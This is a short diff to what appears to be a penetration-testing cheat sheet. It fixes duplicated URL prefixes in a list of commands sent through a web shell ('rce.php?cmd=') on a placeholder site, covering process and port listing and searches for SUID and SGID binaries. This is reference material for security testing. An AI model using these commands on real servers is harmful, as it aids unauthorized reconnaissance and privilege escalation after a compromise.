@@ -37,8 +37,8 @@ http://site.com/rce.php?cmd=ps aux
 http://site.com/rce.php?cmd=ls -la
 http://site.com/rce.php?cmd=netstat -an | grep -i listen
 http://site.com/rce.php?cmd=lsattr -va
-http://site.com/rce.php?cmd=http://site.com/rce.php?cmd=find / -type f -perm -04000 -ls
-http://site.com/rce.php?cmd=http://site.com/rce.php?cmd=netstat -an | grep -i listen
+http://site.com/rce.php?cmd=find / -type f -perm -04000 -ls
+http://site.com/rce.php?cmd=netstat -an | grep -i listen
 http://site.com/rce.php?cmd=find / -type f -perm -02000 -ls
 
 ```
